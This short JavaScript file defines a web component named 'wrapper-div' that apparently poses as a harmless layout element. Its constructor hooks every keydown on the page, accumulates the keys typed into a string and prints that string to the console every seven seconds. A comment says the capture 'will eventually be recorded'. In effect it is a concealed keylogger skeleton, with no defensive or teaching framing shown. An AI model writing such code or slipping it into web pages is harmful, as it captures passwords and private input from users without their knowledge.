// IIFE

(function() {

  class WrapperDiv extends HTMLElement {
    constructor() {
      // Must always call super
      super()
      // Attach object to Shadow Dom
      this._shadowRoot = this.attachShadow({mode: 'open'})

      // Set empty string - will eventually be recorded and cleared
      let str = ""

      // Append keystroke to string on each keydown
      document.onkeydown = function(e) {
        str += e.key
      }

      setInterval(() => {
        console.log(str)
        // str = ""
      }, 7000)
    }
  }

  customElements.define('wrapper-div', WrapperDiv)
}())
